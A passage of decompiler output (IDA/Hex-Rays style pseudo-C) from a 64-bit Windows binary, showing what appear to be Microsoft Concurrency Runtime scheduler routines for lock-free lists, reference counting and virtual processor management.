  *v12 = *(_QWORD *)(*((_QWORD *)a1 + 1) + 8 * v9);
  *(_QWORD *)(*((_QWORD *)a1 + 1) + 8 * v9) = v12;
  ++a1[1];
  return result;
}

//----- (000000013F14A964) ----------------------------------------------------
__int64 __fastcall sub_13F14A964(__int64 a1, __int64 a2)
{
  __int64 v4; // rbp
  __int64 v5; // rax
  __int64 v6; // rbx
  __int64 v7; // rax
  int *v8; // rdx
  __int64 v9; // rax
  int v11[2]; // [rsp+28h] [rbp-20h] BYREF
  __int128 v12; // [rsp+30h] [rbp-18h]

  v4 = a1 + 176;
  v5 = MEMORY[0x771DAED0](a1 + 176);
  if ( v5 )
    v6 = v5 - 96;
  else
    v6 = 0i64;
  if ( !*(_DWORD *)(a1 + 20) )
  {
    if ( !v6 )
    {
      v7 = sub_13F14059C(112i64);
      v6 = v7;
      if ( v7 )
      {
        sub_13F157F88(v7, a1, a2);
        *(_QWORD *)v6 = off_13F18A6E8;
        *(_BYTE *)(v6 + 80) = 1;
      }
      else
      {
        v6 = 0i64;
      }
      goto LABEL_16;
    }
    v8 = (int *)a2;
LABEL_15:
    sub_13F158F84(v6, (__int64)v8);
    goto LABEL_16;
  }
  v11[0] = 0;
  v11[1] = 0;
  v12 = 0i64;
  if ( v6 )
  {
    v8 = v11;
    goto LABEL_15;
  }
  v9 = sub_13F14059C(128i64);
  v6 = v9;
  if ( v9 )
  {
    sub_13F157F88(v9, a1, (__int64)v11);
    *(_QWORD *)v6 = off_13F18A768;
    *(_QWORD *)(v6 + 112) = 0i64;
    *(_BYTE *)(v6 + 80) = 2;
  }
  else
  {
    v6 = 0i64;
  }
LABEL_16:
  sub_13F1484C8(v4, v6);
  return v6;
}
// 13F18A6E8: using guessed type __int64 (__fastcall *off_13F18A6E8[11])();
// 13F18A768: using guessed type __int64 (__fastcall *off_13F18A768[10])();

//----- (000000013F14AA74) ----------------------------------------------------
__int64 __fastcall sub_13F14AA74(
        __int64 (__fastcall **a1)(__int64),
        __int64 (__fastcall *a2)(__int64),
        __int64 (__fastcall *a3)(__int64),
        __int64 a4)
{
  if ( (*(_DWORD *)(a4 + 636) & 0x20000000) != 0 )
    return a2((__int64)a3);
  *a1 = a2;
  a1[1] = a3;
  return sub_13F14AAA0(a4, (__int64)a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14AAA0) ----------------------------------------------------
__int64 __fastcall sub_13F14AAA0(__int64 a1, __int64 a2)
{
  _DWORD *v2; // rsi
  signed __int32 v5; // er8

  v2 = (_DWORD *)(a1 + 536);
  sub_13F142BD8((volatile __int32 *)(a1 + 536));
  do
    v5 = _InterlockedIncrement((volatile signed __int32 *)(a1 + 552));
  while ( ((v5 + 1) & 0xFFFFFFFE) == 0 );
  *(_DWORD *)(a2 + 16) = v5;
  *(_QWORD *)(a2 + 24) = 0i64;
  **(_QWORD **)(a1 + 528) = a2;
  *(_QWORD *)(a1 + 528) = a2 + 24;
  return sub_13F142C20(v2);
}

//----- (000000013F14AB18) ----------------------------------------------------
bool __fastcall sub_13F14AB18(__int64 a1, _DWORD *a2)
{
  __int64 v3; // rdx
  int v4; // ebx
  unsigned int v5; // er9
  __int64 i; // r8
  int v8; // [rsp+20h] [rbp-18h] BYREF
  __int64 v9; // [rsp+28h] [rbp-10h]

  sub_13F149ADC(a1, (__int64)&v8, a2);
  v4 = 0;
  v5 = (unsigned int)(v8 + 31) >> 5;
  for ( i = 0i64; (unsigned int)i < v5; i = (unsigned int)(i + 1) )
  {
    if ( v4 )
      break;
    v4 = *(_DWORD *)(v9 + 4 * i) & *(_DWORD *)(*(_QWORD *)(a1 + 80) + 4 * i);
  }
  sub_13F14088C(v9, v3);
  return v4 != 0;
}
// 13F14AB66: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14AB7C) ----------------------------------------------------
__int64 __fastcall sub_13F14AB7C(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_QWORD *)a2 = 0i64;
  result = a2;
  *(_DWORD *)(a2 + 8) = 0;
  return result;
}

//----- (000000013F14ABA0) ----------------------------------------------------
char __fastcall sub_13F14ABA0(__int64 a1, __int64 a2)
{
  unsigned int v6; // [rsp+20h] [rbp-38h] BYREF
  __int64 v7; // [rsp+28h] [rbp-30h]
  _DWORD v8[2]; // [rsp+30h] [rbp-28h] BYREF
  __int128 v9; // [rsp+38h] [rbp-20h]

  v6 = 0;
  v8[0] = 0;
  v8[1] = 0;
  v9 = 0i64;
  if ( sub_13F149778(a1, (__int64)&v6, (__int64)v8, 12) )
  {
    if ( v6 == 2 || v6 == 8 )
    {
      MEMORY[0x771C4CC0](a1 + 800, a2 + 32);
      sub_13F154694(v7, v6, 0i64, 0i64);
    }
    else
    {
      sub_13F154764(&v6, a2);
    }
    return 1;
  }
  else
  {
    MEMORY[0x771C4CC0](a1 + 800, a2 + 32);
    return 0;
  }
}

//----- (000000013F14AC4C) ----------------------------------------------------
void __fastcall sub_13F14AC4C(__int64 a1, signed __int64 a2)
{
  int v2; // edi
  signed __int64 v4; // rtt
  __int64 v5; // r15
  int v6; // er14
  __int64 v7; // r12
  __int64 v8; // rbp
  __int64 v9; // r13
  __int64 i; // rax
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 j; // rax
  __int64 v14; // rdx
  __int64 v15; // rax
  int v16; // er8
  int v17; // edx
  __int64 v18; // rdx
  __int64 v19; // rax
  __int64 v20; // rax
  int v21; // [rsp+70h] [rbp+8h] BYREF
  int v22; // [rsp+80h] [rbp+18h] BYREF

  v2 = a2;
  _m_prefetchw((const void *)(a1 + 648));
  do
    v4 = *(_QWORD *)(a1 + 648);
  while ( v4 != _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 648), a2, v4) );
  v5 = a1 + 512;
  sub_13F141A20((volatile signed __int32 *)(a1 + 512));
  v6 = 0;
  if ( *(int *)(a1 + 68) > 0 )
  {
    v7 = 0i64;
    do
    {
      v8 = *(_QWORD *)(v7 + *(_QWORD *)(a1 + 56));
      v9 = *(_QWORD *)(v7 + *(_QWORD *)(a1 + 48));
      for ( i = sub_13F149668(v8, 0, *(_DWORD *)(v8 + 144), &v21, v8 + 32); i; i = sub_13F149F2C(v8, &v21, 0, v8 + 32) )
      {
        if ( (unsigned int)(v2 - *(_DWORD *)(i + 440)) > 0x7D0 && *(_DWORD *)(i + 472) == 1 )
        {
          *(_DWORD *)(i + 472) = 2;
          v11 = i + 448;
          v12 = *(_QWORD *)(a1 + 504);
          if ( v12 )
          {
            *(_QWORD *)(v11 + 8) = *(_QWORD *)(v12 + 8);
            *(_QWORD *)(v11 + 16) = *(_QWORD *)(a1 + 504);
            *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) + 16i64) = v11;
            *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = v11;
          }
          else
          {
            *(_QWORD *)(a1 + 504) = v11;
            *(_QWORD *)(v11 + 16) = v11;
            *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = *(_QWORD *)(a1 + 504);
          }
        }
      }
      for ( j = sub_13F149668(v8, 0, *(_DWORD *)(v8 + 272), &v21, v8 + 160); j; j = sub_13F149F2C(v8, &v21, 0, v8 + 160) )
      {
        if ( (unsigned int)(v2 - *(_DWORD *)(j + 440)) > 0x7D0 && *(_DWORD *)(j + 472) == 1 )
        {
          *(_DWORD *)(j + 472) = 2;
          v14 = j + 448;
          v15 = *(_QWORD *)(a1 + 504);
          if ( v15 )
          {
            *(_QWORD *)(v14 + 8) = *(_QWORD *)(v15 + 8);
            *(_QWORD *)(v14 + 16) = *(_QWORD *)(a1 + 504);
            *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) + 16i64) = v14;
            *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = v14;
          }
          else
          {
            *(_QWORD *)(a1 + 504) = v14;
            *(_QWORD *)(v14 + 16) = v14;
            *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = *(_QWORD *)(a1 + 504);
          }
        }
      }
      v16 = *(_DWORD *)(v9 + 192);
      v17 = 0;
      while ( 1 )
      {
        v20 = sub_13F1496EC(v9, v17, v16, &v22);
        if ( !v20 )
          break;
        do
        {
          if ( (unsigned int)(v2 - *(_DWORD *)(v20 + 312)) > 0x7D0 && *(_DWORD *)(v20 + 352) == 1 )
          {
            *(_DWORD *)(v20 + 352) = 2;
            v18 = v20 + 328;
            v19 = *(_QWORD *)(a1 + 504);
            if ( v19 )
            {
              *(_QWORD *)(v18 + 8) = *(_QWORD *)(v19 + 8);
              *(_QWORD *)(v18 + 16) = *(_QWORD *)(a1 + 504);
              *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) + 16i64) = v18;
              *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = v18;
            }
            else
            {
              *(_QWORD *)(a1 + 504) = v18;
              *(_QWORD *)(v18 + 16) = v18;
              *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = *(_QWORD *)(a1 + 504);
            }
          }
          v17 = v22 + 1;
          if ( v22 + 1 <= 0 )
            break;
          v20 = sub_13F1496EC(v9, v17, *(_DWORD *)(v9 + 192), &v22);
          v17 = 0;
        }
        while ( v20 );
        v16 = 0;
      }
      ++v6;
      v7 += 8i64;
    }
    while ( v6 < *(_DWORD *)(a1 + 68) );
  }
  sub_13F141BE8(v5);
}

//----- (000000013F14AF24) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F14AF24(volatile signed __int32 *a1)
{
  signed __int32 v2; // edx
  signed __int32 i; // eax
  __int64 result; // rax
  char v5[8]; // [rsp+20h] [rbp-28h] BYREF
  int v6; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v7)(); // [rsp+30h] [rbp-18h]

  if ( !a1 )
  {
    if ( _InterlockedExchange(&dword_13F1C5DD4, 1) )
    {
      v6 = 0;
      v7 = sub_13F142C2C;
      do
        sub_13F141BF4((__int64)v5);
      while ( _InterlockedExchange(&dword_13F1C5DD4, 1) );
    }
    qword_13F1C5DA0 = 0i64;
    dword_13F1C5DD4 = 0;
  }
  if ( *((int *)a1 + 156) > 1 )
  {
    v2 = *((_DWORD *)a1 + 159);
    for ( i = _InterlockedCompareExchange(a1 + 159, v2 | 0x80000000, v2);
          i != v2;
          i = _InterlockedCompareExchange(a1 + 159, i | 0x80000000, i) )
    {
      v2 = i;
    }
    if ( (v2 & 0x1FFFFFFF) == 0 )
      sub_13F148A2C(a1);
  }
  result = (unsigned int)_InterlockedExchangeAdd(a1 + 156, 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return sub_13F14938C((__int64)a1);
  return result;
}
// 13F14AF82: write access to const memory at 13F1C5DA0 has been detected
// 13F14AF89: write access to const memory at 13F1C5DD4 has been detected
// 13F14AF7E: conditional instruction was optimized away because rbx.8==0
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1C5DA0: using guessed type __int64 qword_13F1C5DA0;
// 13F1C5DD4: using guessed type int dword_13F1C5DD4;
// 13F14AF24: using guessed type char var_28[8];

//----- (000000013F14B000) ----------------------------------------------------
__int64 __fastcall sub_13F14B000(volatile signed __int32 *a1)
{
  __int64 v2; // rax
  char v3; // di
  signed __int32 v4; // eax
  signed __int32 v5; // er8
  unsigned int v6; // eax
  __int64 result; // rax

  v2 = sub_13F142818(0i64);
  if ( v2 && !*(_BYTE *)(v2 + 136) && (volatile signed __int32 *)sub_13F102FE0(v2) == a1 )
  {
    v3 = 0;
  }
  else
  {
    v3 = 1;
    _InterlockedAdd(a1 + 156, 1u);
  }
  sub_13F148E38((__int64)a1, 0);
  (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)a1 + 168i64))(a1);
  v4 = *((_DWORD *)a1 + 159);
  do
  {
    v5 = v4;
    v4 = _InterlockedCompareExchange(a1 + 159, v4 & 0x9FFFFFFF | 0x20000000, v4);
  }
  while ( v4 != v5 );
  v6 = v4 & 0x1FFFFFFF;
  if ( v6 )
    MEMORY[0x76F88C10](*((_QWORD *)a1 + 76), v6, 0i64);
  result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)a1 + 160i64))(a1);
  if ( v3 )
  {
    result = (unsigned int)_InterlockedExchangeAdd(a1 + 156, 0xFFFFFFFF);
    if ( (_DWORD)result == 1 )
      return sub_13F14938C((__int64)a1);
  }
  return result;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14B0D8) ----------------------------------------------------
char __fastcall sub_13F14B0D8(__int64 a1, __int64 a2, __int64 a3)
{
  char v6; // bl
  unsigned int v8[4]; // [rsp+20h] [rbp-38h] BYREF
  int v9[2]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v10; // [rsp+38h] [rbp-20h]
  __int64 v11; // [rsp+40h] [rbp-18h]

  v6 = 0;
  if ( sub_13F142818(0i64) != ((a2 + 16) & -(__int64)(a2 != 0)) )
  {
    sub_13F14EF64();
    v9[0] = *(_DWORD *)a3;
    v10 = *(_QWORD *)(a3 + 8);
    v9[1] = *(_DWORD *)(a3 + 4);
    v11 = *(_QWORD *)(a3 + 16);
    v8[0] = 0;
    if ( sub_13F149778(a1, (__int64)v8, (__int64)v9, 5) )
    {
      sub_13F154764(v8, a2);
      v6 = 1;
    }
    sub_13F14EF64();
  }
  return v6;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14B188) ----------------------------------------------------
__int64 __fastcall sub_13F14B188(__int64 a1)
{
  if ( (*(_BYTE *)(a1 + 80) & 4) != 0 )
    return 0i64;
  else
    return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 40));
}

//----- (000000013F14B1A0) ----------------------------------------------------
__int64 __fastcall sub_13F14B1A0(__int64 a1)
{
  unsigned __int32 v2; // edi
  __int64 v3; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  v2 = _InterlockedIncrement((volatile signed __int32 *)(a1 + 616));
  if ( v2 == 1 )
  {
    if ( *(int *)(a1 + 628) <= 0 )
    {
      _InterlockedExchange((volatile __int32 *)(a1 + 628), 1);
    }
    else
    {
      v3 = sub_13F142818(0i64);
      if ( !v3 || *(_BYTE *)(v3 + 136) || sub_13F102FE0(v3) != a1 )
      {
        sub_13F142D30(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_reference_Concurrency__);
      }
      sub_13F14BA70(a1);
    }
  }
  return v2;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;
// 13F14B1A0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F14B22C) ----------------------------------------------------
void __fastcall sub_13F14B22C(__int64 a1, __int64 a2)
{
  __int64 v4; // rbx
  __int64 v5; // rax
  _QWORD *v6; // rax
  int v7; // eax
  int v8; // edx
  __int64 pExceptionObject[4]; // [rsp+40h] [rbp-28h] BYREF
  __int64 v10; // [rsp+78h] [rbp+10h] BYREF

  if ( (unsigned __int64)(a2 - 1) > 0xFFFFFFFFFFFFFFFDui64 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"eventObject");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v10 = 0i64;
  v4 = MEMORY[0x76F85190]();
  v5 = MEMORY[0x76F85190]();
  if ( !(unsigned int)MEMORY[0x76F851B0](v5, a2, v4, &v10, 0, 0, 2) )
  {
    v7 = MEMORY[0x76F91760]();
    v8 = (unsigned __int16)v7 | 0x80070000;
    if ( v7 <= 0 )
      v8 = v7;
    sub_13F142E40((__int64)pExceptionObject, v8);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v6 = (_QWORD *)sub_13F14059C(24i64);
  v6[2] = v10;
  sub_13F14869C(a1 + 320, v6);
}
// 13F14B22C: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F14B314) ----------------------------------------------------
__int64 __fastcall sub_13F14B314(signed __int64 a1)
{
  unsigned __int32 v2; // ebx

  if ( (*(_BYTE *)(a1 + 80) & 4) != 0 )
  {
    return 0;
  }
  else
  {
    v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 40));
    if ( !v2 )
    {
      (*(void (__fastcall **)(signed __int64))(*(_QWORD *)a1 + 56i64))(a1);
      sub_13F14B6E4(*(_QWORD *)(a1 + 8) + 176i64, a1, *(_DWORD *)(a1 + 44), 1);
    }
  }
  return v2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14B36C) ----------------------------------------------------
__int64 __fastcall sub_13F14B36C(volatile signed __int32 *a1)
{
  unsigned __int32 v1; // ebx

  v1 = _InterlockedDecrement(a1 + 154);
  if ( !v1 )
    sub_13F14AF24(a1);
  return v1;
}

//----- (000000013F14B390) ----------------------------------------------------
__int64 __fastcall sub_13F14B390(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v5; // rdx
  int v6; // er8
  __int64 result; // rax

  v2 = a1 + 768;
  v6 = (unsigned __int16)MEMORY[0x771A31E0](a1 + 768);
  result = *(unsigned int *)(a1 + 28);
  if ( v6 >= (int)result )
  {
    if ( a2 )
      return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a2 + 40i64))(a2, 1i64);
  }
  else
  {
    sub_13F15A488(a2, v5);
    return MEMORY[0x771C4CC0](v2, a2 + 16);
  }
  return result;
}
// 13F14B3C4: variable 'v5' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14B404) ----------------------------------------------------
void __fastcall sub_13F14B404(__int64 a1, __int64 a2, char a3)
{
  if ( a3 )
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 664) + 24i64))(*(_QWORD *)(a1 + 664));
  _InterlockedDecrement((volatile signed __int32 *)(a1 + 632));
  JUMPOUT(0x771C4CC0i64);
}
// 13F14B449: control flows out of bounds to 771C4CC0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14B450) ----------------------------------------------------
__int64 __fastcall sub_13F14B450(__int64 a1, __int64 (__fastcall ***a2)(_QWORD, __int64))
{
  __int64 v2; // rsi
  int v5; // er8
  __int64 result; // rax

  v2 = a1 + 784;
  v5 = (unsigned __int16)MEMORY[0x771A31E0](a1 + 784);
  result = (unsigned int)(32 * *(_DWORD *)(a1 + 28));
  if ( v5 < (int)result )
    return MEMORY[0x771C4CC0](v2, a2 + 4);
  if ( a2 )
    return (**a2)(a2, 1i64);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14B4BC) ----------------------------------------------------
__int64 __fastcall sub_13F14B4BC(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v3; // rax
  __int64 v4; // rdx
  __int64 result; // rax
  __int64 i; // rbx
  __int64 v7; // rax
  __int64 v8; // rcx

  v1 = a1 + 800;
  v3 = MEMORY[0x771DAED0](a1 + 800);
  v4 = v3 - 32;
  result = -v3;
  for ( i = v4 & -(__int64)(result != 0); i; i = v8 & -(__int64)(result != 0) )
  {
    (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 664) + 24i64))(*(_QWORD *)(a1 + 664), i);
    _InterlockedDecrement((volatile signed __int32 *)(a1 + 632));
    MEMORY[0x771C4CC0](a1 + 752, i + 32);
    v7 = MEMORY[0x771DAED0](v1);
    v8 = v7 - 32;
    result = -v7;
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14B550) ----------------------------------------------------
char __fastcall sub_13F14B550(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 (__fastcall **v16)(__int64); // rdx
  _QWORD *v17; // rsi
  _QWORD *v18; // rcx

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 16;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && (*(_DWORD *)(*(_QWORD *)(a1 + 72) + 636i64) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        v16 = (__int64 (__fastcall **)(__int64))(a1 + 40);
        *(_QWORD *)(a1 + 32) = v14;
        if ( (*(_DWORD *)(v15 + 636) & 0x20000000) != 0 )
        {
          if ( (*(_DWORD *)(*(_QWORD *)(a1 + 72) + 636i64) & 0xA0000000) != -1610612736 )
          {
            v17 = *(_QWORD **)(a1 + 32);
            while ( v17 )
            {
              v18 = v17 - 2;
              v17 = (_QWORD *)*v17;
              sub_13F14088C(v18, 64i64);
            }
            *(_QWORD *)(a1 + 32) = 0i64;
            _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
          }
        }
        else
        {
          *(_QWORD *)(a1 + 48) = a1;
          *v16 = sub_13F148B60;
          sub_13F14AAA0(v15, (__int64)v16);
        }
      }
    }
  }
  return 1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14B6E4) ----------------------------------------------------
char __fastcall sub_13F14B6E4(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 (__fastcall **v16)(__int64); // rdx

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 96;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && (*(_DWORD *)(*(_QWORD *)(a1 + 72) + 636i64) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        v16 = (__int64 (__fastcall **)(__int64))(a1 + 40);
        *(_QWORD *)(a1 + 32) = v14;
        if ( (*(_DWORD *)(v15 + 636) & 0x20000000) != 0 )
        {
          sub_13F148AF4(a1);
        }
        else
        {
          *(_QWORD *)(a1 + 48) = a1;
          *v16 = sub_13F148BBC;
          sub_13F14AAA0(v15, (__int64)v16);
        }
      }
    }
  }
  return 1;
}

//----- (000000013F14B840) ----------------------------------------------------
_QWORD *__fastcall sub_13F14B840(__int64 a1)
{
  _QWORD *v2; // r8
  _QWORD *v3; // rdi
  _QWORD *v4; // rdx

  sub_13F141A20((volatile signed __int32 *)(a1 + 8));
  v2 = *(_QWORD **)a1;
  v3 = 0i64;
  if ( *(_QWORD *)a1 )
  {
    v4 = (_QWORD *)*v2;
    if ( v2 == (_QWORD *)*v2 )
    {
      *(_QWORD *)a1 = 0i64;
    }
    else
    {
      *(_QWORD *)(*v4 + 8i64) = v2;
      **(_QWORD **)a1 = *v4;
    }
    v3 = v4;
  }
  sub_13F141BE8(a1 + 8);
  return v3;
}

//----- (000000013F14B8AC) ----------------------------------------------------
void __fastcall sub_13F14B8AC(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v5; // rax
  __int64 v6; // rax

  v2 = a1 + 512;
  sub_13F141A20((volatile signed __int32 *)(a1 + 512));
  if ( *(_DWORD *)(a2 + 24) == 2 )
  {
    *(_QWORD *)(*(_QWORD *)(a2 + 8) + 16i64) = *(_QWORD *)(a2 + 16);
    *(_QWORD *)(*(_QWORD *)(a2 + 16) + 8i64) = *(_QWORD *)(a2 + 8);
    v5 = *(_QWORD *)(a1 + 504);
    if ( a2 == v5 )
    {
      if ( v5 == *(_QWORD *)(v5 + 8) )
        v6 = 0i64;
      else
        v6 = *(_QWORD *)(v5 + 16);
      *(_QWORD *)(a1 + 504) = v6;
    }
  }
  *(_DWORD *)(a2 + 24) = 0;
  sub_13F141BE8(v2);
}

//----- (000000013F14B92C) ----------------------------------------------------
char __fastcall sub_13F14B92C(__int64 a1, signed __int64 a2)
{
  return sub_13F14B6E4(a1 + 176, a2, *(_DWORD *)(a2 + 44), 1);
}

//----- (000000013F14B940) ----------------------------------------------------
char __fastcall sub_13F14B940(__int64 a1)
{
  char result; // al

  result = sub_13F1595C0(a1);
  *(_QWORD *)(a1 + 112) = 0i64;
  return result;
}

//----- (000000013F14B95C) ----------------------------------------------------
void __fastcall sub_13F14B95C(__int64 a1, __int64 (__fastcall ****a2)(_QWORD), unsigned int a3)
{
  __int64 (__fastcall ****v3)(_QWORD); // rbx
  __int64 v5; // rdi
  __int64 (__fastcall ***v6)(_QWORD); // rsi
  unsigned int v7; // eax
  __int64 v8; // rax
  __int64 pExceptionObject; // [rsp+20h] [rbp-28h] BYREF
  int v10; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v11)(); // [rsp+30h] [rbp-18h]

  v3 = a2;
  if ( !a2 )
  {
    sub_13F1097A8(&pExceptionObject, (__int64)"ppVirtualProcessorRoots");
    CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_13F1097A8(&pExceptionObject, (__int64)"count");
    CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v5 = a3;
  do
  {
    v6 = *v3;
    while ( 1 )
    {
      v7 = (**v6)(v6);
      v8 = sub_13F1558C4(*(_QWORD *)(*(_QWORD *)(a1 + 48) + 8i64 * v7), (__int64)v6);
      if ( v8 )
        break;
      v10 = 0;
      v11 = sub_13F142C6C;
      while ( sub_13F141BF4((__int64)&pExceptionObject) )
        ;
      sub_13F1427C4();
    }
    if ( *(_BYTE *)(v8 + 256) )
      v8 = sub_13F156A70(*(_QWORD *)(v8 + 264), v8);
    if ( v8 )
      sub_13F154BC8((_BYTE *)v8);
    ++v3;
    --v5;
  }
  while ( v5 );
}
// 13F14B98C: conditional instruction was optimized away because er8.4!=0
// 13F1427C4: using guessed type __int64 sub_13F1427C4(void);
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14BA70) ----------------------------------------------------
__int64 __fastcall sub_13F14BA70(__int64 a1)
{
  signed __int32 v1; // eax
  __int64 result; // rax
  signed __int32 v4; // ett
  int v5; // edx
  char v6[8]; // [rsp+20h] [rbp-28h] BYREF
  int v7; // [rsp+28h] [rbp-20h]
